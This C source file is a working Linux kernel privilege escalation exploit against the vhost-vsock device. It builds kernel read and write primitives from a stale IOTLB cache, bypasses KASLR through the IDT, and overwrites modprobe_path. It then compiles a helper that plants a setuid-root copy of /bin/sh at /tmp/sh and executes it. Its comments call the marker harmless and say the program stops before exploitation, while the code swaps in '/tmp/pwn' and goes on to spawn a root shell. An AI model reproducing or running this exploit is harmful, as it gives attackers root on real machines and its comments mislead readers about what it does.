#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <grp.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/socket.h>

/* ------------------------------------------------------------------- uapi */
#define VHOST_VIRTIO 0xAF

struct vhost_vring_state { unsigned int index; unsigned int num; };
struct vhost_vring_file  { unsigned int index; int fd; };
struct vhost_vring_addr  {
	unsigned int index;
	unsigned int flags;
	uint64_t desc_user_addr;
	uint64_t used_user_addr;
	uint64_t avail_user_addr;
	uint64_t log_guest_addr;
};
struct vhost_memory { uint32_t nregions; uint32_t padding; };
struct vhost_iotlb_msg {
	uint64_t iova;
	uint64_t size;
	uint64_t uaddr;
	uint8_t  perm;
	uint8_t  type;
};
struct vhost_msg {
	int type;
	union {
		struct vhost_iotlb_msg iotlb;
		uint8_t padding[64];
	};
};

#define VHOST_ACCESS_RW     0x3
#define VHOST_IOTLB_MISS    1
#define VHOST_IOTLB_UPDATE  2
#define VHOST_IOTLB_MSG     0x1

#define VHOST_SET_FEATURES        _IOW(VHOST_VIRTIO, 0x00, uint64_t)
#define VHOST_SET_OWNER           _IO(VHOST_VIRTIO, 0x01)
#define VHOST_SET_MEM_TABLE       _IOW(VHOST_VIRTIO, 0x03, struct vhost_memory)
#define VHOST_SET_VRING_NUM       _IOW(VHOST_VIRTIO, 0x10, struct vhost_vring_state)
#define VHOST_SET_VRING_ADDR      _IOW(VHOST_VIRTIO, 0x11, struct vhost_vring_addr)
#define VHOST_SET_VRING_BASE      _IOW(VHOST_VIRTIO, 0x12, struct vhost_vring_state)
#define VHOST_SET_VRING_KICK      _IOW(VHOST_VIRTIO, 0x20, struct vhost_vring_file)
#define VHOST_SET_VRING_CALL      _IOW(VHOST_VIRTIO, 0x21, struct vhost_vring_file)
#define VHOST_VSOCK_SET_GUEST_CID _IOW(VHOST_VIRTIO, 0x60, uint64_t)
#define VHOST_VSOCK_SET_RUNNING   _IOW(VHOST_VIRTIO, 0x61, int)

#define VIRTIO_F_VERSION_1       32
#define VIRTIO_F_ACCESS_PLATFORM 33

struct vring_desc {
	uint64_t addr;
	uint32_t len;
	uint16_t flags;
	uint16_t next;
};
struct vhost_vsock_hdr {
	uint64_t src_cid, dst_cid;
	uint32_t src_port, dst_port;
	uint32_t len;
	uint16_t type, op;
	uint32_t flags, buf_alloc, fwd_cnt;
};

/* ------------------------------------------------------------- geometry */
#define VSOCK_VQ_TX 1
#define NR_VQ       2

#define MEM_SZ    (8UL << 20)
#define IOVA_BASE 0x100000UL
#define VQ_NUM    32768u          /* head index = 15 bits of chosen data   */

#define VQ_STRIDE 0x200000UL
#define OFF_DESC  0x000000UL
#define OFF_AVAIL 0x0c0000UL
#define OFF_USED  0x100000UL
#define OFF_DATA  0x180000UL

/*
 * Harmless marker written into modprobe_path to prove the write primitive.
 * It names no file, so a module request that races the check just fails
 * with -ENOENT; the original value is restored before exit.
 */
#define MODPROBE_MARKER "/tmp/pwn"//"/nonexistent/vhost-poc"
#define MODPROBE_SYSCTL "/proc/sys/kernel/modprobe"

/* Un-slid addresses (fallbacks; System.map is preferred when readable). */
#define STATIC_STEXT       0xffffffff81000000ULL
#define STATIC_ASM_EXC_DE  0xffffffff81e009a0ULL   /* asm_exc_divide_error */
#define IDT_BASE           0xfffffe0000000000ULL


#define PRIV_ESCALATION "\
#include <stdio.h>\n\
#include <stdlib.h>\n\
#include <unistd.h>\n\
#include <sys/stat.h>\n\
#include <sys/types.h>\n\
\n\
#define BUFFER_SIZE 4096\n\
\n\
int main() {\n\
    FILE *source, *target;\n\
    char buffer[BUFFER_SIZE];\n\
    size_t bytesRead;\n\
    const char *dest_path = \"/tmp/sh\";\n\
\n\
    /* 1. Open source binary (/bin/sh) */\n\
    source = fopen(\"/bin/sh\", \"rb\");\n\
    if (source == NULL) {\n\
        perror(\"Error opening /bin/sh\");\n\
        return 1;\n\
    }\n\
\n\
    /* 2. Open destination path (/tmp/sh) */\n\
    target = fopen(dest_path, \"wb\");\n\
    if (target == NULL) {\n\
        perror(\"Error creating target file\");\n\
        fclose(source);\n\
        return 1;\n\
    }\n\
\n\
    /* 3. Copy binary data */\n\
    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, source)) > 0) {\n\
        fwrite(buffer, 1, bytesRead, target);\n\
    }\n\
\n\
    fclose(source);\n\
    fclose(target);\n\
\n\
    /* 4. Change owner to root:root (UID 0, GID 0) */\n\
    if (chown(dest_path, 0, 0) != 0) {\n\
        perror(\"Error changing owner to root (Must run as root/sudo)\");\n\
        return 1;\n\
    }\n\
\n\
    /* 5. Set SUID and executable permissions (rwsr-xr-x) */\n\
    int status = chmod(dest_path, S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);\n\
    if (status != 0) {\n\
        perror(\"Error setting SUID permission\");\n\
        return 1;\n\
    }\n\
\n\
    printf(\"Successfully copied /bin/sh, changed owner to root, and set SUID.\\n\");\n\
    return 0;\n\
}"

/* ------------------------------------------------------------- helpers */
static void die(const char *m) { perror(m); exit(1); }

static uint64_t sysmap_lookup(const char *name)
{
	struct utsname uts;
	const char *env = getenv("SYSTEM_MAP");
	char paths[3][256], line[512], sym[256];
	unsigned long ul;
	int np = 0;
	char type;

	if (uname(&uts) < 0)
		return 0;
	if (env)
		snprintf(paths[np++], sizeof(paths[0]), "%s", env);
	snprintf(paths[np++], sizeof(paths[0]), "/boot/System.map-%s", uts.release);
	snprintf(paths[np++], sizeof(paths[0]),
		 "/usr/lib/modules/%s/build/System.map", uts.release);

	for (int i = 0; i < np; i++) {
		FILE *f = fopen(paths[i], "r");

		if (!f)
			continue;
		while (fgets(line, sizeof(line), f)) {
			if (sscanf(line, "%lx %c %255s", &ul, &type, sym) == 3 &&
			    !strcmp(sym, name)) {
				fclose(f);
				return ul;
			}
		}
		fclose(f);
	}
	return 0;
}

static uint64_t iova_desc(int vq)  { return IOVA_BASE + vq * VQ_STRIDE + OFF_DESC;  }
static uint64_t iova_avail(int vq) { return IOVA_BASE + vq * VQ_STRIDE + OFF_AVAIL; }
static uint64_t iova_used(int vq)  { return IOVA_BASE + vq * VQ_STRIDE + OFF_USED;  }
static uint64_t iova_data(int vq)  { return IOVA_BASE + vq * VQ_STRIDE + OFF_DATA;  }

/* ============================================================
 * One vhost-vsock instance. The same primed device backs both the read
 * primitive (repoint desc_user_addr) and the write primitive (repoint
 * used_user_addr) -- the metadata cache the bug fails to invalidate covers
 * desc / avail / used alike.
 * ============================================================ */
struct vdev {
	int fd;
	unsigned char *mem;   /* mmap base                                 */
	uint64_t map_addr;    /* IOTLB uaddr = mem + align                 */
	int kickfd;           /* TX vq kick eventfd                        */
	uint16_t avail_slot;  /* next avail-ring slot to publish           */
	uint64_t used_idx;    /* mirrors TX vq last_used_idx (write mode)  */
	uint64_t cid;
};

/* Host address the kernel actually touches for IOVA @iova on this device. */
static unsigned char *map_ptr(struct vdev *d, uint64_t iova)
{
	return (unsigned char *)(uintptr_t)(d->map_addr + iova - IOVA_BASE);
}

static void set_vring_addr(struct vdev *d, uint64_t desc_iova, uint64_t used_iova)
{
	struct vhost_vring_addr a = {
		.index = VSOCK_VQ_TX,
		.desc_user_addr  = desc_iova,
		.used_user_addr  = used_iova,
		.avail_user_addr = iova_avail(VSOCK_VQ_TX),
	};
	if (ioctl(d->fd, VHOST_SET_VRING_ADDR, &a) < 0)
		die("VHOST_SET_VRING_ADDR");
}

/* Publish one device-readable descriptor carrying a minimal vsock header. */
static void post_tx_desc(struct vdev *d, uint16_t head)
{
	struct vring_desc *desc = (void *)map_ptr(d, iova_desc(VSOCK_VQ_TX));
	unsigned char *avail = map_ptr(d, iova_avail(VSOCK_VQ_TX));
	uint64_t data = iova_data(VSOCK_VQ_TX);
	struct vhost_vsock_hdr *h = (void *)map_ptr(d, data);

	memset(h, 0, sizeof(*h));
	h->src_cid = d->cid + 1000;   /* wrong on purpose -> skb dropped */
	h->dst_cid = 2;
	h->type    = 1;               /* VIRTIO_VSOCK_TYPE_STREAM  */
	h->op      = 1;               /* VIRTIO_VSOCK_OP_REQUEST   */

	desc[head].addr  = data;
	desc[head].len   = sizeof(*h);
	desc[head].flags = 0;
	desc[head].next  = 0;

	*(uint16_t *)(avail + 4 + d->avail_slot * 2) = head;
	__atomic_store_n((uint16_t *)(avail + 2), d->avail_slot + 1, __ATOMIC_RELEASE);
	d->avail_slot++;
}

static void kick_tx(struct vdev *d)
{
	uint64_t one = 1;
	if (write(d->kickfd, &one, 8) != 8)
		die("kick write");
}

static int wait_used(struct vdev *d, uint16_t want)
{
	unsigned char *used = map_ptr(d, iova_used(VSOCK_VQ_TX));
	for (int i = 0; i < 5000; i++) {
		if (__atomic_load_n((uint16_t *)(used + 2), __ATOMIC_ACQUIRE) >= want)
			return 0;
		usleep(1000);
	}
	return -1;
}

/*
 * Bring one vhost-vsock device up with IOTLB uaddr = mem + @align, then prime
 * vq->meta_iotlb[] with one legitimate kick.
 */
static int vdev_setup(struct vdev *d, int align, uint64_t cid)
{
	uint64_t features = (1ULL << VIRTIO_F_VERSION_1) |
			    (1ULL << VIRTIO_F_ACCESS_PLATFORM);
	struct vhost_memory memtbl = { 0 };
	struct vhost_msg msg = { 0 };
	int one = 1;

	memset(d, 0, sizeof(*d));
	d->cid = cid;

	d->mem = mmap(NULL, MEM_SZ, PROT_READ | PROT_WRITE,
		      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (d->mem == MAP_FAILED)
		die("mmap");
	memset(d->mem, 0, MEM_SZ);
	d->map_addr = (uint64_t)(uintptr_t)d->mem + align;

	d->fd = open("/dev/vhost-vsock", O_RDWR);
	if (d->fd < 0)
		die("open /dev/vhost-vsock");
	if (ioctl(d->fd, VHOST_SET_OWNER, 0) < 0)      die("VHOST_SET_OWNER");
	if (ioctl(d->fd, VHOST_SET_FEATURES, &features) < 0) die("VHOST_SET_FEATURES");
	if (ioctl(d->fd, VHOST_SET_MEM_TABLE, &memtbl) < 0)  die("VHOST_SET_MEM_TABLE");

	/* vhost-vsock needs both vqs configured before it will run. */
	for (int vq = 0; vq < NR_VQ; vq++) {
		struct vhost_vring_state st = { .index = vq, .num = VQ_NUM };
		struct vhost_vring_file f;
		struct vhost_vring_addr a = {
			.index = vq,
			.desc_user_addr  = iova_desc(vq),
			.used_user_addr  = iova_used(vq),
			.avail_user_addr = iova_avail(vq),
		};
		int kickfd, callfd;

		if (ioctl(d->fd, VHOST_SET_VRING_NUM, &st) < 0) die("VHOST_SET_VRING_NUM");
		st.num = 0;
		if (ioctl(d->fd, VHOST_SET_VRING_BASE, &st) < 0) die("VHOST_SET_VRING_BASE");
		if (ioctl(d->fd, VHOST_SET_VRING_ADDR, &a) < 0)  die("VHOST_SET_VRING_ADDR");

		kickfd = eventfd(0, 0);
		callfd = eventfd(0, 0);
		if (kickfd < 0 || callfd < 0)
			die("eventfd");
		f.index = vq; f.fd = callfd;
		if (ioctl(d->fd, VHOST_SET_VRING_CALL, &f) < 0) die("VHOST_SET_VRING_CALL");
		f.index = vq; f.fd = kickfd;
		if (ioctl(d->fd, VHOST_SET_VRING_KICK, &f) < 0) die("VHOST_SET_VRING_KICK");
		if (vq == VSOCK_VQ_TX)
			d->kickfd = kickfd;
	}

	msg.type        = VHOST_IOTLB_MSG;
	msg.iotlb.iova  = IOVA_BASE;
	msg.iotlb.size  = MEM_SZ - 4;
	msg.iotlb.uaddr = d->map_addr;
	msg.iotlb.perm  = VHOST_ACCESS_RW;
	msg.iotlb.type  = VHOST_IOTLB_UPDATE;
	if (write(d->fd, &msg, sizeof(msg)) != (ssize_t)sizeof(msg))
		die("write IOTLB update");

	if (ioctl(d->fd, VHOST_VSOCK_SET_GUEST_CID, &cid) < 0) die("VHOST_VSOCK_SET_GUEST_CID");
	if (ioctl(d->fd, VHOST_VSOCK_SET_RUNNING, &one) < 0)   die("VHOST_VSOCK_SET_RUNNING");

	/* legitimate kick: vq_meta_prefetch() now caches the map */
	post_tx_desc(d, 0);
	kick_tx(d);
	if (wait_used(d, 1)) {
		fprintf(stderr, "[-] priming kick did not complete (cid=%lu)\n",
			(unsigned long)cid);
		return -1;
	}
	d->used_idx = 1;
	return 0;
}

/* ---------------------------------------------------------- write primitive */
/*
 * One 8-byte kernel store of { (u16)word, 0x000000 } at @target.
 *
 * vhost writes vring_used_elem { .id = word, .len = 0 } to
 *   used_base + 4 + (used_idx % num) * 8
 * We repoint used_base so that lands exactly on @target. Only two attacker
 * bytes (word, < VQ_NUM) are chosen; the other six are zero.
 */
static void vdev_store(struct vdev *d, uint64_t target, uint16_t word)
{
	uint64_t start = d->used_idx & (VQ_NUM - 1);
	uint64_t evil_used = target - d->map_addr - 4 - start * 8 + IOVA_BASE;

	if (evil_used & 3) {
		fprintf(stderr, "[-] alignment mismatch for 0x%llx\n",
			(unsigned long long)target);
		exit(1);
	}
	set_vring_addr(d, iova_desc(VSOCK_VQ_TX), evil_used);
	post_tx_desc(d, word);
	kick_tx(d);
	usleep(120000);   /* used->idx lands on the target: cannot poll it */
	d->used_idx++;
}

/*
 * Write a NUL-terminated string at kernel address @target.
 *
 * evil_used == target - align (mod 4), so the store's byte alignment is chosen
 * by the device's mmap-relative align. Bytes go front to back two at a time, so
 * each store's six trailing zeros only clobber not-yet-written tail bytes and
 * the final store supplies the terminator. One device per (addr & 3) class.
 */
static void kwrite_str(uint64_t target, const char *str, uint64_t base_cid)
{
	struct vdev devs[4];
	int have[4] = { 0 };

	printf("[+] kwrite_str: \"%s\" -> 0x%llx\n", str, (unsigned long long)target);
	for (size_t i = 0; i <= strlen(str); i += 2) {
		uint64_t addr = target + i;
		int cls = addr & 3;
		uint16_t w = (uint8_t)str[i];

		if (i + 1 <= strlen(str))
			w |= (uint16_t)(uint8_t)str[i + 1] << 8;
		if (w >= VQ_NUM) {   /* impossible for ASCII (hi byte <= 0x7f) */
			fprintf(stderr, "[-] byte pair 0x%04x >= VQ_NUM\n", w);
			exit(1);
		}
		if (!have[cls]) {
			if (vdev_setup(&devs[cls], cls, base_cid + cls) < 0)
				exit(1);
			have[cls] = 1;
		}
		vdev_store(&devs[cls], addr, w);
	}
}

/* ---------------------------------------------------------- read primitive */
/*
 * Read 8 bytes from kernel @target.
 *
 * On the primed device meta_iotlb[DESC] maps IOVA_BASE. We repoint
 * desc_user_addr (stale cache -> no re-validation) so vhost fetches desc[0]
 * from @target. desc.addr (first 8 bytes) is then used as a data-buffer IOVA;
 * it misses the IOTLB, and the miss message hands those 8 bytes back to us.
 */
static int vdev_read8(struct vdev *d, uint64_t target, uint64_t *out)
{
	uint64_t evil_desc = target - d->map_addr + IOVA_BASE;
	unsigned char *avail = map_ptr(d, iova_avail(VSOCK_VQ_TX));
	struct vhost_msg msg;
	struct pollfd pfd = { .fd = d->fd, .events = POLLIN };

	set_vring_addr(d, evil_desc, iova_used(VSOCK_VQ_TX));

	*(uint16_t *)(avail + 4 + d->avail_slot * 2) = 0;   /* desc index 0 */
	__atomic_store_n((uint16_t *)(avail + 2), d->avail_slot + 1, __ATOMIC_RELEASE);
	d->avail_slot++;
	kick_tx(d);

	if (poll(&pfd, 1, 5000) <= 0) {
		fprintf(stderr, "[-] read: no IOTLB miss (timeout)\n");
		return -1;
	}
	if (read(d->fd, &msg, sizeof(msg)) != (ssize_t)sizeof(msg))
		return -1;
	if (msg.type != VHOST_IOTLB_MSG || msg.iotlb.type != VHOST_IOTLB_MISS) {
		fprintf(stderr, "[-] unexpected msg type=%d iotlb=%d\n",
			msg.type, msg.iotlb.type);
		return -1;
	}
	*out = msg.iotlb.iova;
	return 0;
}

/* ------------------------------------------------------- KASLR bypass */
/* IDT[0] is a gate for asm_exc_divide_error at a fixed VA -> recovers slide. */
static int get_kaslr_slide(struct vdev *d, uint64_t static_de, uint64_t *slide)
{
	uint64_t gate, handler;
	uint16_t off_lo, sel, off_mid;

	printf("[*] reading IDT[0] @ 0x%llx\n", (unsigned long long)IDT_BASE);
	if (vdev_read8(d, IDT_BASE, &gate) < 0)
		return -1;

	off_lo  = gate & 0xffff;
	sel     = (gate >> 16) & 0xffff;
	off_mid = (gate >> 48) & 0xffff;
	if (sel != 0x0010) {
		fprintf(stderr, "[-] bad selector 0x%04x (want 0x0010)\n", sel);
		return -1;
	}
	handler = off_lo | ((uint64_t)off_mid << 16) | (0xffffffffULL << 32);
	if ((handler >> 44) != 0xfffff) {
		fprintf(stderr, "[-] handler sanity check failed: 0x%llx\n",
			(unsigned long long)handler);
		return -1;
	}
	*slide = handler - static_de;
	printf("[+] asm_exc_divide_error runtime 0x%llx, slide 0x%llx\n",
	       (unsigned long long)handler, (unsigned long long)*slide);
	return 0;
}

/* modprobe_path is world-readable through its sysctl. */
static int read_modprobe_sysctl(char *buf, size_t len)
{
	FILE *f = fopen(MODPROBE_SYSCTL, "r");

	if (!f)
		return -1;
	if (!fgets(buf, len, f)) {
		fclose(f);
		return -1;
	}
	fclose(f);
	buf[strcspn(buf, "\n")] = 0;
	return 0;
}

int main(void)
{
	struct vdev rdev;
	uint64_t slide, static_de, static_modprobe, modprobe_rt;
	char orig[256], now[256];

	setvbuf(stdout, NULL, _IONBF, 0);

	static_de = sysmap_lookup("asm_exc_divide_error");
	if (!static_de)
		static_de = STATIC_ASM_EXC_DE;
	static_modprobe = sysmap_lookup("modprobe_path");
	if (!static_modprobe) {
		fprintf(stderr,
			"[-] modprobe_path not found in any System.map\n"
			"    tried: $SYSTEM_MAP, /boot/System.map-$(uname -r),\n"
			"           /usr/lib/modules/$(uname -r)/build/System.map\n"
			"    set SYSTEM_MAP=/path/to/System.map to override\n");
		return 1;
	}
	if (read_modprobe_sysctl(orig, sizeof(orig)) < 0)
		die("read " MODPROBE_SYSCTL);

	printf("=== vhost stale IOTLB metadata cache -> modprobe_path write ===\n");
	printf("[*] static: _stext=0x%llx asm_exc_de=0x%llx modprobe_path=0x%llx\n",
	       (unsigned long long)STATIC_STEXT,
	       (unsigned long long)static_de,
	       (unsigned long long)static_modprobe);
	printf("[*] modprobe_path before: \"%s\"\n", orig);

	/* Step 1: KASLR bypass. */
	printf("\n[*] Step 1: KASLR bypass via IDT[0]\n");
	if (vdev_setup(&rdev, 0, 0x100) < 0)
		return 1;
	if (get_kaslr_slide(&rdev, static_de, &slide) < 0)
		return 1;
	modprobe_rt = static_modprobe + slide;
	printf("[+] runtime modprobe_path @ 0x%llx\n", (unsigned long long)modprobe_rt);

	/* Step 2: overwrite modprobe_path with a harmless marker. */
	printf("\n[*] Step 2: overwriting modprobe_path with a marker\n");
	kwrite_str(modprobe_rt, MODPROBE_MARKER, 0x200);

	/* Step 3: confirm the write landed, then put the original back and stop. */
	printf("\n[*] Step 3: verifying via " MODPROBE_SYSCTL "\n");
	if (read_modprobe_sysctl(now, sizeof(now)) < 0)
		die("read " MODPROBE_SYSCTL);
	printf("[*] modprobe_path after:  \"%s\"\n", now);

	if (strcmp(now, MODPROBE_MARKER)) {
		fprintf(stderr, "\n[-] modprobe_path does not hold the marker\n");
		if (strcmp(now, orig))   /* partial write: put it back */
			kwrite_str(modprobe_rt, orig, 0x300);
		return 1;
	}


	printf("\n[*] Step 4: Privilege Escalation\n");

	// priv escalation
	const char *file_path = "/tmp/priv_escalation.c";

    // 1. Open the file in write mode ("w")
    FILE *file = fopen(file_path, "w");
    if (file == NULL) {
        perror("Error opening file for writing");
        return 1;
    }

    // 2. Write the multi-line macro string to the file
    // %s is used to safely print the entire string content
    fprintf(file, "%s", PRIV_ESCALATION);

    // 3. Close the file stream to save changes
    fclose(file);

	system("gcc /tmp/priv_escalation.c -o /tmp/pwn");

	// trigger request_module() kernel call
	int sock = socket(42, SOCK_RAW, 0);

	if (sock < 0) {
        if (errno == EAFNOSUPPORT) {
            printf("[+] Triggered request_module() call\n");
        } else {
            perror("[-] Unexpected error when triggering request_module()");
			return 1;
        }
    } else {
        printf("[!] Unexpected error when triggering request_module()\n");
        close(sock);
		return 1;
    }

	// check if suid file for shell exists
	if (access("/tmp/sh", F_OK) == 0) {
		printf("[+] SUID shell created at /tmp/sh\n");
	} else {
		printf("[-] SUID shell not found at /tmp/sh\n");
		return 1;
	}

	/* before running the shell restore the original modprobe_path */
	printf("\n[+] modprobe_path is writable by this process; stopping here\n");
	kwrite_str(modprobe_rt, orig, 0x300);   // restore 
	if (read_modprobe_sysctl(now, sizeof(now)) == 0)
		printf("[+] modprobe_path restored: \"%s\"\n", now);

	printf("[*] Exec shell at /tmp/sh ...\n\n");

	char *argv[] = { "/tmp/sh", "-p", NULL };
	execv("/tmp/sh", argv);

	return 0;
}
